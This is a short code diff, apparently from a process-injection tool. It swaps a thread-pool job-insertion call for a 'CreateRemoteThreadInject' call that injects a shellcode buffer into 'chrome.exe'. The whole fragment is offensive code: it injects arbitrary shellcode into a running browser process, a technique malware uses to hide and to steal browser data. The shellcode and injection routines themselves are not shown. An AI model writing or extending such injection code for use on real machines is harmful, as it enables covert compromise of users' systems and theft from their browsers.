@@ -19,5 +19,7 @@ int main() {
 		return -1;
 	}
 
-	RemoteTpJobInsertion(lpShellcode, dwShellcodeSize);
+	//RemoteTpJobInsertion(lpShellcode, dwShellcodeSize);
+	wchar_t wsName[] = L"chrome.exe";
+	CreateRemoteThreadInject(lpShellcode, dwShellcodeSize, wsName);
 }
